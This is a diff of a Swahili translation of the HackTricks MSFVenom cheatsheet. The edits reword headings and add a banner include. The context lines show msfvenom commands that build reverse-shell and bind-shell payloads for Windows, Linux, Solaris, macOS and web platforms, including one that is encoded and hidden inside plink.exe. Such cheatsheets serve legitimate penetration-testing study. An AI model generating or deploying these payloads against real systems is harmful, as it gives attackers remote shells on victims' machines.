@@ -1,19 +1,21 @@
-# MSFVenom - Mwongozo wa Haraka
+# MSFVenom - CheatSheet
+
+{{#include ../../banners/hacktricks-training.md}}
 
 ---
 
-## Msingi wa msfvenom
+## Misingi ya msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
 Tumia `-a` kuchagua payload architecture na `--platform` kuchagua target platform yake.<sup>[[1]](#references)</sup>
 
-## Orodha
+## Kuorodhesha
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-Amri hizi huorodhesha moduli za payload na encoder zinazopatikana katika framework iliyosakinishwa.<sup>[[1]](#references)</sup>
+Amri hizi huorodhesha modules za payload na encoder zinazopatikana kwenye framework iliyosakinishwa.<sup>[[1]](#references)</sup>
 
 ## Parameta za kawaida wakati wa kuunda shellcode
 ```bash
@@ -56,7 +58,7 @@ msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > enco
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
-## Linux Payloads
+## Payloads za Linux
 
 ### Reverse Shell
 ```bash
@@ -71,7 +73,7 @@ msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) 
 ```bash
 msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
 ```
-## **MAC Payloads**
+## **Payloads za MAC**
 
 ### **Reverse Shell:**
 ```bash
@@ -81,7 +83,7 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ma
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
-## **Payloads za Msingi wa Wavuti**
+## **Payloads za Kwenye Wavuti**
 
 ### **PHP**
 
@@ -113,7 +115,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Payloads za Lugha ya Script**
+## **Payload za Lugha za Script**
 
 ### **Perl**
 ```bash
